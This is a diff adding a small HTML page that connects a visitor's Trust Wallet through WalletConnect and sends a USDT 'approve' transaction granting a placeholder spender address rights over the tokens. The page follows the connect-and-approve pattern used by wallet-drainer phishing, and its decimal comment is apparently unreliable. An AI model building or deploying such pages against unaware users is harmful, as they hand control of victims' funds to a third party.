@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>WalletConnect + USDT Approve</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.7.1/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.6.2/dist/umd/index.min.js"></script>
+</head>
+<body>
+  <h2>Connect to Trust Wallet and Approve USDT</h2>
+  <button onclick="connectWallet()">Connect & Approve</button>
+
+  <script>
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const USDT_ABI = [
+      {
+        constant: false,
+        inputs: [
+          { name: "_spender", type: "address" },
+          { name: "_value", type: "uint256" }
+        ],
+        name: "approve",
+        outputs: [{ name: "", type: "bool" }],
+        type: "function"
+      }
+    ];
+
+    const SPENDER_ADDRESS = "0xYourSpenderAddressHere"; // Замените сюда нужный адрес
+    const AMOUNT = "100000000"; // 100 USDT (6 знаков)
+
+    async function connectWallet() {
+      const WalletConnect = window.WalletConnect.default;
+      const QRCodeModal = window.QRCodeModal.default;
+
+      const connector = new WalletConnect({
+        bridge: "https://bridge.walletconnect.org",
+        qrcodeModal: QRCodeModal
+      });
+
+      if (!connector.connected) {
+        await connector.createSession();
+      }
+
+      connector.on("connect", async (error, payload) => {
+        if (error) {
+          console.error("Connection error:", error);
+          return;
+        }
+
+        const { accounts } = payload.params[0];
+        const userAddress = accounts[0];
+
+        const web3 = new Web3(connector);
+        const contract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
+        const txData = contract.methods.approve(SPENDER_ADDRESS, AMOUNT).encodeABI();
+
+        const tx = {
+          from: userAddress,
+          to: USDT_ADDRESS,
+          data: txData,
+          gas: 100000
+        };
+
+        try {
+          const txHash = await web3.eth.sendTransaction(tx);
+          alert("Transaction sent! Hash: " + txHash.transactionHash);
+        } catch (err) {
+          alert("Transaction failed: " + err.message);
+        }
+      });
+    }
+  </script>
+</body>
+</html>
